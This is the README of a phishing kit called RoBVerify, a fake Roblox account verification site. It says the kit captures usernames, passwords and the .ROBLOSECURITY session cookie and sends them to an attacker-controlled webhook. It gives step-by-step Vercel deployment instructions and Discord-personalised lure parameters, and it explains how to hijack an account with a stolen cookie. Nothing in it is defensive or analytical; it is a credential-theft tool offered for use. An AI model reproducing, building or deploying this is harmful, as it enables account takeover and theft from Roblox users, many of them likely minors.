# RoBVerify

Fake Roblox account verification site. Captures the username, password and the
`.ROBLOSECURITY` session cookie, then posts them to a webhook.

## Files

- `index.html` — the whole flow (welcome -> login -> loading -> success)
- `login.js` — serverless function, does the Roblox login and fires the webhook
- `test.js` — hit `/api/test` to confirm your webhook works
- `vercel.json` — routing

## Deploy

1. Push this repo to GitHub.
2. On Vercel: Add New -> Project -> import the repo -> Deploy.
3. Vercel -> Settings -> Environment Variables -> add `WEBHOOK_URL` with your
   webhook URL (Discord webhook, webhook.site, Zapier, etc.) -> Redeploy.
4. Visit `/api/test` to confirm the webhook works.

If you'd rather not use an env var, hardcode the URL in the `WEBHOOK_URL`
constant at the top of `login.js` and `test.js`.

## Optional URL params

`?d=<discord_id>&n=<discord_name>` — shows "Welcome, <name>" on the landing
page and includes the Discord account in the webhook payload.

## Using a captured cookie

Set `.ROBLOSECURITY` in a browser on roblox.com (DevTools -> Application ->
Cookies -> https://www.roblox.com) and reload. Or call
`https://users.roblox.com/v1/users/authenticated` with it as a `Cookie` header.

## Notes

- 2FA accounts return no cookie. You get `twoStep: true` in the payload instead.
- The fake loading screen takes about 3 seconds (4 steps x 760ms in `index.html`).
